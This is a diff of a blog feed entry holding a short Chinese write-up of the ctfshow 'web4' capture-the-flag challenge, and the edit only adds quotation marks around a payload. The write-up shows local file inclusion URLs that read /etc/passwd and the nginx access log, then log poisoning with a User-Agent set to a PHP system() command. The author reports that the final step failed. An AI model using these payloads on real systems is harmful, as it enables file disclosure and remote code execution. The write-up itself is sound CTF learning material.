@@ -8,7 +8,7 @@
       <link href="/2025/12/07/%E7%AC%AC%E5%9B%9B%E5%91%A8/"/>
       <url>/2025/12/07/%E7%AC%AC%E5%9B%9B%E5%91%A8/</url>
       
-        <content type="html"><![CDATA[<p>ctfshow的web4<br>访问<a href="http://010012b-06b4-4ff2-a76a-597024a43899.challenge.ctf.show/show?url=/etc/passwd">http://010012B-06b4-4ff2-a76a-597024a43899.challenge.ctf.show/show?url=/etc/passwd</a><br>验证LFI成功<br><img src="/images/19.png" alt="图片"><br>访问日志，<a href="http://010012b-06b4-4ff2-a76a-597024a43899.challenge.ctf.show/show?url=/var/log/nginx/access.log">http://010012B-06b4-4ff2-a76a-597024a43899.challenge.ctf.show/show?url=/var/log/nginx/access.log</a><br>得到<br><img src="/images/20.png" alt="图片"><br>利用burp拦截，修改User-Agent为<?php system('cat /flag');?></p><p><img src="/images/21.png" alt="图片"></p><p>按理说应该能得出flag，但是不知道是哪步出了问题</p>]]></content>
+        <content type="html"><![CDATA[<p>ctfshow的web4<br>访问<a href="http://010012b-06b4-4ff2-a76a-597024a43899.challenge.ctf.show/show?url=/etc/passwd">http://010012B-06b4-4ff2-a76a-597024a43899.challenge.ctf.show/show?url=/etc/passwd</a><br>验证LFI成功<br><img src="/images/19.png" alt="图片"><br>访问日志，<a href="http://010012b-06b4-4ff2-a76a-597024a43899.challenge.ctf.show/show?url=/var/log/nginx/access.log">http://010012B-06b4-4ff2-a76a-597024a43899.challenge.ctf.show/show?url=/var/log/nginx/access.log</a><br>得到<br><img src="/images/20.png" alt="图片"><br>利用burp拦截，修改User-Agent为“<?php system('cat /flag');?>”</p><p><img src="/images/21.png" alt="图片"></p><p>按理说应该能得出flag，但是不知道是哪步出了问题</p>]]></content>
       
       
       
